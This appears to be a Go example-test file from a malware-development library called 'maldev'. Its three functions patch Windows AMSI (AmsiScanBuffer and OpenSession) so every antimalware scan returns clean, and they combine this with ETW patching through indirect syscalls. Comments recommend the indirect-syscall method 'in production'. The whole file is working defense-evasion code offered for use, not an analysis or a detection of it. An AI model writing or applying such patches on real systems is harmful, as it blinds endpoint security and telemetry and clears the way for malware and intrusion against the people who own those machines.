//go:build windows

package amsi_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/amsi"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Patch AmsiScanBuffer so any AMSI scan returns a clean verdict.
// Pass nil for the Caller to use WinAPI (debug); use an indirect-syscall
// caller in production.
func ExamplePatchScanBuffer() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if err := amsi.PatchScanBuffer(caller); err != nil {
		fmt.Println("patch:", err)
	}
}

// PatchAll combines ScanBuffer and OpenSession in one call. Idempotent.
func ExamplePatchAll() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	_ = amsi.PatchAll(caller)
}

// Compose AMSI + ETW patches via evasion.ApplyAll. Both techniques share
// the same Caller; one indirect-syscall instance covers everything.
func ExampleAll() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	results := evasion.ApplyAll([]evasion.Technique{
		amsi.All(), // ScanBufferPatch + OpenSessionPatch
	}, caller)
	for name, err := range results {
		if err != nil {
			fmt.Printf("%s: %v\n", name, err)
		}
	}
}
